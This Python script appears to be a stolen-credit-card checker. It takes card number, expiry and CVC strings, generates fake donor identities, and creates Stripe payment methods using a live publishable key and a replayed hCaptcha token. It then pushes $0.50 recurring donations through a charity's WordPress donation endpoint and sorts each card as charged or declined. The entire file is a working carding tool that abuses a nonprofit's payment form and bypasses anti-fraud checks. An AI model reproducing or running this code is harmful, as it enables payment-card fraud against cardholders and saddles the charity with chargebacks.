# Charge5_fast.py - ULTRA FAST - Based on working mady.py approach
# Uses direct Stripe PM creation + ccfoundationorg.com donation

import requests
import json
import random
import string

# --- Quick Generators ---
first_names = ["Michael", "John", "David", "James", "Robert", "William", "Richard", "Joseph"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]

def gen_name():
    return random.choice(first_names), random.choice(last_names)

def gen_phone():
    return f"{random.randint(201,999)}{random.randint(100,999)}{random.randint(1000,9999)}"

def gen_email(first, last):
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    return f"{first.lower()}.{last.lower()}{random.randint(100,9999)}@{random.choice(domains)}"

def StaleksFloridaCheckoutVNew(ccx):
    """
    ULTRA FAST checkout using ccfoundationorg.com
    Based on the working mady.py approach
    """
    try:
        # Parse card
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return {"error": "Invalid card format"}
        
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        # Convert year format
        if len(yy) == 4:
            yy = yy[2:]
        
        # Generate user data
        first, last = gen_name()
        email = gen_email(first, last)
        phone = gen_phone()
        
        # STEP 1: Create Stripe Payment Method (FAST!)
        pm_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        # Use exact format from working mady.py with hcaptcha token
        pm_data = f'type=card&billing_details[name]=Dievn&billing_details[email]=haowxjds%40gmail.com&billing_details[address][line1]=Kaode5+City&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=87e42ba5-9910-462d-8b5e-69ea049036fad3667d&muid=e3385f96-ab50-440b-b4fc-62efc795e561fa4880&sid=7163a14d-1ac8-40fe-a426-b5b031f5611f263c50&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&client_attribution_metadata[client_session_id]=80615da3-cce9-4376-823b-57c20b5afe79&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY2MDE1MTU2LCJjZGF0YSI6IlJCNHA2M25xZGg4YSsxc1o3NTNmTXlydkh1L21zUFZQSVdtRW5aS2lqYU54UlFqZkxwVGNSNTl3OW1GVk4rZGxUTE91RTN1RktpaGVGcWNwUjk1MUN2UDNVVkE3U2JGM2pqWGtyV3ZQSEdQRHlFOTZmYWJ6bjJiS0QwOTlWQUNYalNnTG9oS3NYVVlZYzZENWltSDZRWEhWVkdnZXNEbmRhbUowNlF5N3E3cUxUWW9JeDBLYkZTNmlUVFhIcmpPbVFBUjUzWTBZK0NmMHJ0YzgiLCJwYXNza2V5IjoiSnhNK2NGYmZXaEpzdGV5NVJPWkR1R1c4bVJXRXpyYkVvYkNZRHlrdzZCNEhXOUkrMnNxYm5vZk5OOGRPNmpRS1VKMUVRTmh2TENJSmh0QWNxWm9UZXQyMTBzY0plOVlZMU00UDdJYVFKdEZZbjdnVkpHU1BTYkdCbTZFVXI4clljR0FyYkJudTlsSTV5b3o1RzRlbDdZZmpsc3ZPMEhOUjF1ZEZwcHlZTWhXeFNoR1krVWxURGJlYUswQXlHem9sa3czd1k2ajMvQTJTaXlBbmxZb09kRXNtc3Rsd1F4TVhyYVlDNjVQVUFPUFRiVlpkcGRyeS9kajBmdm9EWDRpS2hFZnVFTmtubFYzZU1iTktwSUhUOU03VEN4T3ErM01ZWFQzSVBIbXNlV2xHZHRDcFdWYWI1dmJFRnB3YnV2Vnl3MmJwZlFaa0lzTVJGK0ZKcXg0V3RmOEY5OHNMZDhHdHZDWkxWZzJjMmYrWVdrSlhKVUVaSnlCTlZWNWd4U3ZFQjVBNEcxcERRb3EvQUtBL2NLSElBbXEzQWRBakt6bGJoTWJGYWZJZEVKdnk3RnI5aUpGQVZXTk5LSEtNb2ZMTkVlc2Frd2ZkRG1oQWQydklnUXFKcGtoK09XT2ZOZHpjdW5KdVZKRE0rN0JjRDBJcDhhVEl6Ym1sdENqaEhhZ2tKVWpjYXBENUJERk9jU1VyajBjYUVZVlhWbzNjaW5VM000UXg1Y1pkdExzcHVDNDVHNXdIRWtrekVVODJ6cmpCM25pMDlSZm9yQyt4V002ZWRqYi9KTDRYWTJ4R1ZhbzRqajJBbnN0Z3JLUi9hWmJadVo5QXlJRjNGYU1SNGgxU0RybWlPdXRCeTA3L0RCc1h6SFZzWWZ0dXFPODdrbzd6aHFhR3NBOFI5QVU5elozZDl3UWVSTzZpbDRHTG1Nb0hBTmhsQnJ4NFEzV2lod0lVa0V2L0FrSTBDQTkrMi9OK2Y2S2FYd2NKV3RlVTJ3N3l6Nk1Fb0ROZ2g2Rk05WWVjNjRLSGVYeWhac1FqbW1ybjNyLzJZSXU5dlFGZHdpK2xudHhOWkNSeDVvNjh4Q0xQSktkZHl4cTFUeWVFbXdxVndGdHVMM1JYL01LbTc2c3BNNEpBVDkxRWc1Y3F2WmE4N0RnMmFTWjJLdEU5cGM5M1RMSitkOHZoNE04SkJMM3lUTmpUS1lkTVc5UmM1bW9PUXA2QjJpT0Q0TUhDS3BmbXZ2cHJBZG5XWHZHVE1PczlqaFhGWVVqb2RUNHFzbW01REUwakdRV3JFMEsxRmkwdE5ucnJzMEdnOTdnMitxdXFiN2owUElMN1RpZE9HdE05Y0lRL2tRMlp4cjBRU2o3blRtTmVnbkt2L2MrUGlqV3JhSXVwQUdIa1hXQjE1UDExSFU2eVNVR0g0cm92bjhNODJ0bXVEQlRUaE92WllieWpVc2dDT2ZObFp1bldSc1Fjb2VnVkY5bkluaVZFeUpkWGgrbjdsT2ZWSUN3MTBuQU0vTkJSbHZLWjNjSjUycGozYXRNNUZJMmpZa05IWTJEV2F0SzNQT0JzQ2h6NGI2RmE3MUxjZVZGdnpLUE1SaWthajNLbURUQkV4UTBLTkpDR0pKQm84UC9ZdTNmTTYzeVRTN3ovMHN4Yjk2elIwQ1M1c3dOc1FoZ3ExTUg5TkFBKzJ4L1pSNzNtY0h0WDhuS0lGQ0dZdXpWN0hTSnhhczQrSzBxZzY5MyszcmVKQW9odVZEa2Y4V2xvUGZ5N04yS0x5ME1vTWpFMEZub3NkSlBSS0ZHajNpKzVYMFhiR3lFMVg2ZThkUzhLRDY2b3QrS3ZQMWkyVWJZcHhTcHIyQUZyZHdadkppMXFzRkJpdVlFRDZOejBwcnJVUmJDbW5UcTJjRy9hRFE1bWVoL2NEblFXRVR0NXRIeWNwY2ljbWg0NGlxKzRGZXBua1BJUGZCM0padmt5MVdMeFNYTTI5SzJvYlZYQkkzT3RQd1F6cTBjZlQ2Nk5GS2Z3anpFczh2N0pjTmJQajI4eWJTd2dyYm56T2QwSE85RW5oSTZ1QlhCdk91a3d2NnBpcnlXdzJIb0N6c2ZjckZJNmNMcTVIOERuUm5HK0lpTG13UUdvdG55MklyN09qV3JLaHBrRHdtWFNLRVFhWHdvZVZjY08ydVZIQUVzTEZFN003OWF0YnkrMWxyeks2VU1KNklUK0RrL1NSelF0MElXVTdUVHFOMXB1MEM4Z0E0ZUQyN3IrdnNzWUx5R01HeUFlQ0JtQzN0UlcrMzkxZklBU1VQb1E2NDEzZDF0TTNybkxpTFJtbDBNa1o4eFByNzJXbkg0ZURZTmQ1VWl5cWRHYWNscDV6dnJWUVVrWmpSU3QzZVJWYzlJbnhhT3FBUThIR2NEcXN1aWhrT0UwbkxUZzFEM3ltS1l4YXpYd3IxUlhKbWRYUE03Ti9WSVpGd2hlQU5oZmMwbXJ2eHA5ZGE2cHVUU21zQ2ZSMUZsNzdUNmFjalAzRE9kQ0tCZ1QzTjBBbXFKQWFMczhMckszc1hyM2FGdnZRYmoxanU5a1F4UXF5a25PNEs4dFkrcE50dzFjVFJ2cUJIdXcvNlRjOGJLNkxpMjgrd0FQaWxaN0lmRkxnUmlGa0xjTFdCS3JYZWZ5cmFaVzBYeHVqK0UzMjNDeS9IWjZBVW93Tk5aVjk0UXhvL29FdzdNejdjRFMiLCJrciI6IjMyMjNlZDAxIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.u0G0Gyzy225QmYEEQ4ns_bg6JE9jYTuc_P6iyTYLTuU'
        
        try:
            pm_response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                       headers=pm_headers, 
                                       data=pm_data, 
                                       timeout=15)
            
            if pm_response.status_code != 200:
                return {"error": f"PM creation failed: HTTP {pm_response.status_code}"}
            
            pm_json = pm_response.json()
            
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message', 'Unknown error')
                if 'number' in error_msg.lower():
                    return "Your card number is incorrect."
                elif 'cvc' in error_msg.lower() or 'security' in error_msg.lower():
                    return "Your card's security code is incorrect."
                elif 'expired' in error_msg.lower():
                    return "Your card has expired."
                else:
                    return f"Declined ({error_msg})"
            
            if 'id' not in pm_json:
                return {"error": "No PM ID in response"}
            
            pm_id = pm_json['id']
            
        except requests.exceptions.Timeout:
            return {"error": "Timeout creating payment method"}
        except Exception as e:
            return {"error": f"PM creation error: {str(e)[:50]}"}
        
        # STEP 2: Submit donation with PM (FAST!)
        donation_headers = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        donation_data = {
            'charitable_form_id': '69433fc4b65ac',
            '69433fc4b65ac': '',
            '_charitable_donation_nonce': '49c3e28b2a',
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'description': 'CC Foundation Donation Form',
            'ID': '1056420',
            'donation_amount': 'custom',
            'custom_donation_amount': '0.50',
            'recurring_donation': 'month',
            'title': 'Mr',
            'first_name': first,
            'last_name': last,
            'email': email,
            'address': 'Street 27',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        try:
            donation_response = requests.post(
                'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
                headers=donation_headers,
                data=donation_data,
                timeout=20
            )
            
            response_text = donation_response.text.lower()
            
            # Check for success
            if 'requires_action' in response_text or 'succeeded' in response_text or 'thank you' in response_text:
                return "Charged $0.50"
            
            # Try to parse JSON for error details
            try:
                response_json = donation_response.json()
                if 'errors' in response_json:
                    errors = response_json['errors']
                    if isinstance(errors, dict):
                        first_error = next(iter(errors.values()), 'Unknown error')
                        return f"Declined ({first_error})"
                    elif isinstance(errors, list) and errors:
                        return f"Declined ({errors[0]})"
                return f"Declined (Donation failed)"
            except:
                # Not JSON, check HTML response
                if 'declined' in response_text:
                    return "Your card was declined."
                elif 'insufficient' in response_text:
                    return "Insufficient funds."
                else:
                    return f"Declined (Unknown response)"
                    
        except requests.exceptions.Timeout:
            return {"error": "Timeout during donation"}
        except Exception as e:
            return {"error": f"Donation error: {str(e)[:50]}"}
    
    except Exception as e:
        return {"error": f"Critical error: {str(e)[:50]}"}

# Test
if __name__ == "__main__":
    test_card = "5566258985615466|12|25|299"
    print(f"Testing: {test_card[:4]}********")
    result = StaleksFloridaCheckoutVNew(test_card)
    print(f"Result: {result}")
